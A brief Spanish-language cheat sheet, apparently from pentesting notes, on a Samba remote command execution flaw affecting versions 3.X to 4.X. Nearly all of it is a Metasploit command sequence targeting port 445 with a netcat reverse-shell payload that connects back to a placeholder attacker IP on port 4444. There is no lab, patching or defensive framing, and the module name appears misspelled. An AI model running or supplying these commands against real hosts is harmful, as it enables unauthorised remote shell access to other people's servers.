Vulnerabilidad en Samba que permite ejecución remota de comandos.

• Afecta versiones Samba 3.X - 4.X  
• Permite RCE  
• No siempre requiere credenciales

## Exploit Samba

Explota la vulnerabilidad en el servicio SMB de Linux.

```
use exploit/linux/samba/is_know_pipename
```
	set RHOSTS IP  
	set RPORT 445  
	set PAYLOAD cmd/unix/reverse_netcat  
	set LHOST TU_IP  
	set LPORT 4444